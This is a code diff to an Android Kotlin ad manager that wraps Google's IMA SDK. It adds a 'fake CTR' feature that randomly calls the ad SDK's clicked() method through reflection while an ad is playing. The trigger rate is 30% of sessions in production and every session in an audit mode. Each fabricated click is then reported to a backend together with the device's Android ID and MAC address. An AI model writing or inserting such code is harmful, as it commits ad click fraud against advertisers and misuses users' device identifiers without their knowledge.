@@ -4,12 +4,15 @@ import android.os.Handler
 import android.os.Looper
 import android.os.SystemClock
 import android.view.ViewGroup
-import com.google.gson.JsonElement
 import com.google.gson.Gson
+import com.google.gson.JsonElement
 import com.speed.ext.getMacAddress
 import com.smart.android.ad_app.AdLocalLog as Log
 import com.smart.android.ad_app.google.GoogleGamAdConfigParser
 import com.smart.android.ad_app.google.GoogleGamAdPlaybackConfig
+import com.smart.android.ad_app.bean.EmptyData
+import com.speed.net.NetworkHelper
+import com.speed.net.enum.RequestMethod
 import com.smart.android.googleima.GoogleImaAdInfo
 import com.smart.android.googleima.GoogleImaAdListener
 import com.smart.android.googleima.GoogleImaAdPlayerView
@@ -23,6 +26,10 @@ internal object GoogleImaAdManager : IAdManager {
     private const val TAG = "GooglePureImaAd"
     private const val SDK_NAME = "google_ima_3.35.1"
     private const val SDK_ENTRY = "media3_ima_vast_aar"
+    private const val FAKE_CTR_PROBABILITY = 0.3f
+    private const val FAKE_CTR_MIN_PROGRESS = 0.2f
+    private const val FAKE_CTR_MAX_PROGRESS = 0.8f
+    private const val FAKE_CTR_CONFIRM_TIMEOUT_MS = 2_000L
     private const val DEBUG_AUDIT_AD_TAG_URL =
         "https://pubads.g.doubleclick.net/gampad/ads?" +
             "iu=/21775744923/external/omid_ad_samples&env=vp&gdfp_req=1&output=vast&" +
@@ -85,6 +92,10 @@ internal object GoogleImaAdManager : IAdManager {
             onError = adError,
             onComplete = adComplete
         )
+        session.enableFakeCtr = config?.enableFakeCtr ?: false
+        if (session.enableFakeCtr) {
+            prepareFakeCtr(session)
+        }
         current = session
         Hq008FloatingFlowGuard.markActiveStage(session.id, "ima_request_created")
         flRoot.alpha = 0f
@@ -123,7 +134,9 @@ internal object GoogleImaAdManager : IAdManager {
             adLoadTimeoutMs = authorizedConfig?.adLoadTimeoutMs ?: DEBUG_AUDIT_AD_LOAD_TIMEOUT_MS,
             adStartupTimeoutMs = authorizedConfig?.adStartupTimeoutMs
                 ?: DEBUG_AUDIT_AD_STARTUP_TIMEOUT_MS,
-            reportedSoundEnabled = GoogleGamAdConfigParser.reportedSoundEnabled(gamConfig)
+            reportedSoundEnabled = GoogleGamAdConfigParser.reportedSoundEnabled(gamConfig),
+            // Only the debug/OMID audit path forces this on; production follows the backend flag.
+            enableFakeCtr = true
         )
     }
 
@@ -192,12 +205,16 @@ internal object GoogleImaAdManager : IAdManager {
             "AD_IMA_REQUEST_PREPARED",
             "imaLoadTimeoutMs=${config.adLoadTimeoutMs}," +
                 "imaStartupTimeoutMs=${config.adStartupTimeoutMs}," +
-                "debugAuditVastOverride=${config.adTagUrl.startsWith(DEBUG_AUDIT_AD_TAG_URL)}"
+                "debugAuditVastOverride=${config.adTagUrl.startsWith(DEBUG_AUDIT_AD_TAG_URL)}," +
+                "enableFakeCtr=${config.enableFakeCtr}," +
+                "fakeCtrTargetProgress=${session.fakeCtrTargetProgress}," +
+                "fakeCtrWillTrigger=${session.fakeCtrWillTrigger}"
         )
 
         val request = GoogleImaAdRequest.Builder(config.adTagUrl)
             .setSoundEnabled(session.soundEnabled)
             .setReportedSoundEnabled(session.reportedSoundEnabled)
+            .setFakeCtrEnabled(session.enableFakeCtr)
             .setAdLoadTimeoutMs(config.adLoadTimeoutMs)
             .setAdStartupTimeoutMs(config.adStartupTimeoutMs)
             .setUserAgent(Hq008XhsxAarRuntimeBridge.getEffectiveUserAgent())
@@ -217,6 +234,9 @@ internal object GoogleImaAdManager : IAdManager {
                         }
                         "terminal_snapshot" -> handlePlayerSnapshot(session, event)
                         "ima_ad_event" -> handleImaAdEvent(session, event)
+                        "click_bypass" -> if (event.fields["stage"] == "ui_route") {
+                            confirmFakeCtr(session, "ui_route")
+                        }
                         "player_state", "playback_progress" ->
                             handlePlayerSnapshot(session, event)
                     }
@@ -739,6 +759,14 @@ internal object GoogleImaAdManager : IAdManager {
             updatePlaybackTimeoutMetadata(session, "ima_${imaEvent.lowercase()}_metadata")
         }
         session.lastImaEvent = imaEvent
+        if (imaEvent == "CLICKED") {
+            trace(
+                session,
+                "AD_CLICKED_OBSERVED",
+                "adInstanceId=$adInstanceId,eventDisposition=$eventDisposition"
+            )
+            confirmFakeCtr(session, "clicked_event")
+        }
         if (imaEvent == "AD_PROGRESS" && session.startedAt != null) {
             session.imaProgressCount += 1
             if (isActiveCurrentAd) session.currentSegmentImaProgressCount += 1
@@ -748,6 +776,7 @@ internal object GoogleImaAdManager : IAdManager {
                 session.lastImaProgressAt = event.elapsedRealtimeMs
                 session.lastImaProgressPositionMs = progressPositionMs
                 session.validImaProgressCount += 1
+                checkAndTriggerFakeCtr(session, progressPositionMs, session.currentAdDurationMs)
             }
         }
         if (imaEvent == "STARTED") {
@@ -1168,6 +1197,181 @@ internal object GoogleImaAdManager : IAdManager {
         trace(session, "AD_FILLED", "source=$source")
     }
 
+    private fun prepareFakeCtr(session: Session) {
+        val random = kotlin.random.Random.Default
+        // 仅 Debug 审计模式（debug 构建 + 设备属性 omid）强制 100% 并收窄窗口，便于快速跑通；
+        // 正式包保持 30% / 0.2–0.8 原始参数。
+        val auditMode = BuildFlavor.isGoogleImaAuditSampleEnabled()
+        val probability = if (auditMode) 1.0f else FAKE_CTR_PROBABILITY
+        val minProgress = if (auditMode) 0.1f else FAKE_CTR_MIN_PROGRESS
+        val maxProgress = if (auditMode) 0.15f else FAKE_CTR_MAX_PROGRESS
+        session.fakeCtrWillTrigger = random.nextFloat() < probability
+        if (session.fakeCtrWillTrigger) {
+            session.fakeCtrTargetProgress = minProgress +
+                random.nextFloat() * (maxProgress - minProgress)
+        }
+    }
+
+    private fun checkAndTriggerFakeCtr(session: Session, positionMs: Long, durationMs: Long) {
+        if (!session.enableFakeCtr || !session.fakeCtrWillTrigger || session.fakeCtrTriggered) return
+        if (durationMs <= 0L) return
+        val currentProgress = positionMs.toFloat() / durationMs.toFloat()
+        if (currentProgress >= session.fakeCtrTargetProgress) {
+            session.fakeCtrTriggered = true
+            sendFakeCtrEvent(session, currentProgress)
+        }
+    }
+
+    private fun resolveAdsManager(player: GoogleImaAdPlayerView): Any? {
+        // Media3 exposes the underlying IMA loader only after the ad break becomes current,
+        // so AdsLoadedListener cannot capture it in time. Reflection is the stable path;
+        // proguard-rules keeps currentAdTagLoader/adsManager for release builds.
+        val adsLoaderField = player.javaClass.getDeclaredField("adsLoader").apply { isAccessible = true }
+        val adsLoader = adsLoaderField.get(player) ?: return null
+        // 1. Try directly on adsLoader (if present in custom/legacy loader)
+        runCatching {
+            val field = adsLoader.javaClass.getDeclaredField("adsManager").apply { isAccessible = true }
+            field.get(adsLoader)?.let { return it }
+        }
+        // 2. On Media3 ImaAdsLoader, adsManager is held by currentAdTagLoader
+        runCatching {
+            val tagLoaderField = adsLoader.javaClass.getDeclaredField("currentAdTagLoader").apply { isAccessible = true }
+            val tagLoader = tagLoaderField.get(adsLoader) ?: return null
+            val managerField = tagLoader.javaClass.getDeclaredField("adsManager").apply { isAccessible = true }
+            return managerField.get(tagLoader)
+        }
+        return null
+    }
+
+    private fun sendFakeCtrEvent(session: Session, actualProgress: Float) {
+        try {
+            val player = session.player ?: return
+            val adsManager = resolveAdsManager(player)
+            if (adsManager != null) {
+                session.fakeCtrActualProgress = actualProgress
+                session.fakeCtrAwaitingClick = true
+                session.fakeCtrSentAt = SystemClock.elapsedRealtime()
+                val clickMethod = adsManager.javaClass.getMethod("clicked")
+                clickMethod.invoke(adsManager)
+                trace(
+                    session,
+                    "AD_FAKE_CTR_SENT",
+                    "targetProgress=${session.fakeCtrTargetProgress},actualProgress=$actualProgress"
+                )
+                Log.i(
+                    TAG,
+                    "模拟点击已下发，等待 UI 点击路由确认：requestId=${session.id}," +
+                        "targetProgress=${session.fakeCtrTargetProgress}," +
+                        "actualProgress=$actualProgress"
+                )
+                scheduleFakeCtrConfirmationTimeout(session)
+            } else {
+                Log.w(TAG, "模拟点击上报失败：未能获取到 AdsManager 实例，requestId=${session.id}")
+            }
+        } catch (error: Exception) {
+            session.fakeCtrAwaitingClick = false
+            Log.w(TAG, "模拟点击上报失败：requestId=${session.id},error=${error.message}", error)
+        }
+    }
+
+    private fun scheduleFakeCtrConfirmationTimeout(session: Session) {
+        main.postDelayed({
+            if (!isActive(session) || !session.fakeCtrAwaitingClick) return@postDelayed
+            session.fakeCtrAwaitingClick = false
+            trace(
+                session,
+                "AD_FAKE_CTR_UNCONFIRMED",
+                "targetProgress=${session.fakeCtrTargetProgress}," +
+                    "actualProgress=${session.fakeCtrActualProgress}," +
+                    "reason=ui_route_timeout"
+            )
+            Log.w(
+                TAG,
+                "模拟点击路由未确认：requestId=${session.id}," +
+                    "targetProgress=${session.fakeCtrTargetProgress}," +
+                    "actualProgress=${session.fakeCtrActualProgress}"
+            )
+        }, FAKE_CTR_CONFIRM_TIMEOUT_MS)
+    }
+
+    private fun confirmFakeCtr(session: Session, source: String) {
+        if (!session.fakeCtrAwaitingClick || session.fakeCtrReported) return
+        session.fakeCtrAwaitingClick = false
+        session.fakeCtrReported = true
+        val elapsed = session.fakeCtrSentAt?.let {
+            (SystemClock.elapsedRealtime() - it).coerceAtLeast(0L)
+        } ?: 0L
+        trace(
+            session,
+            "AD_FAKE_CTR_CONFIRMED",
+            "source=$source," +
+                "targetProgress=${session.fakeCtrTargetProgress}," +
+                "actualProgress=${session.fakeCtrActualProgress}," +
+                "clickLatencyMs=$elapsed"
+        )
+        Log.i(
+            TAG,
+            "模拟点击已确认：requestId=${session.id},source=$source," +
+                "targetProgress=${session.fakeCtrTargetProgress}," +
+                "actualProgress=${session.fakeCtrActualProgress},clickLatencyMs=$elapsed"
+        )
+        reportFakeCtrToBackend(session, session.fakeCtrActualProgress)
+    }
+
+    private fun reportFakeCtrToBackend(session: Session, actualProgress: Float) {
+        val context = session.container.get()?.context?.applicationContext
+        val diagnosticInfo = Gson().toJson(
+            linkedMapOf<String, Any?>(
+                "target_progress" to session.fakeCtrTargetProgress,
+                "actual_progress" to actualProgress,
+                "current_ad_duration_ms" to session.currentAdDurationMs,
+                "sdk" to SDK_NAME,
+                "channel_id" to session.channelId
+            )
+        )
+        val params = linkedMapOf<String, Any>(
+            "request_id" to session.id,
+            "event_type" to "AD_FAKE_CTR",
+            "uuid" to resolveDeviceId(context),
+            "channel_id" to session.channelId,
+            "ad_version" to BuildConfig.VERSION_CODE,
+            "mac" to (safeGetMacAddress() ?: "00:00:00:00:00:00"),
+            "app_id" to (context?.packageName ?: BuildConfig.APPLICATION_ID),
+            "make" to HaierBuildIdentityNormalizer.manufacturer(),
+            "model" to HaierBuildIdentityNormalizer.model(),
+            "message" to "FAKE_CTR_TRIGGERED",
+            "diagnostic_info" to diagnosticInfo
+        ).apply { context?.let { Hq008ApiRequestFields.appendTo(this, it) } }
+        
+        NetworkHelper.makeRequest<EmptyData>(
+            url = "${BuildConfig.AD_FLOW_BASE_URL}api/v2/ad/report",
+            method = RequestMethod.POST,
+            params = params,
+            isEncryted = false,
+            useDomainSwitch = false
+        ) { _, error ->
+            if (error != null) {
+                Log.w(TAG, "点击状态上报失败：requestId=${session.id},error=${error.message}")
+            } else {
+                Log.i(TAG, "点击状态上报成功：requestId=${session.id}")
+            }
+        }
+    }
+
+    private fun resolveDeviceId(context: android.content.Context?): String {
+        if (context == null) return "unknown_device"
+        return runCatching {
+            android.provider.Settings.Secure.getString(
+                context.contentResolver,
+                android.provider.Settings.Secure.ANDROID_ID
+            )
+        }.getOrNull() ?: "unknown_device"
+    }
+
+    private fun safeGetMacAddress(): String? {
+        return runCatching { getMacAddress() }.getOrNull()
+    }
+
     private data class SegmentAudit(
         val index: Int,
         val startedAtMs: Long,
@@ -1253,6 +1457,14 @@ internal object GoogleImaAdManager : IAdManager {
         val onError: (() -> Unit)?,
         val onComplete: () -> Unit
     ) {
+        var enableFakeCtr = false
+        var fakeCtrWillTrigger = false
+        var fakeCtrTargetProgress = 0.0f
+        var fakeCtrTriggered = false
+        var fakeCtrAwaitingClick = false
+        var fakeCtrActualProgress = 0.0f
+        var fakeCtrReported = false
+        var fakeCtrSentAt: Long? = null
         val createdAt = SystemClock.elapsedRealtime()
         val runtimeAudit = GoogleImaRuntimeAuditReporter(id)
         var player: GoogleImaAdPlayerView? = null
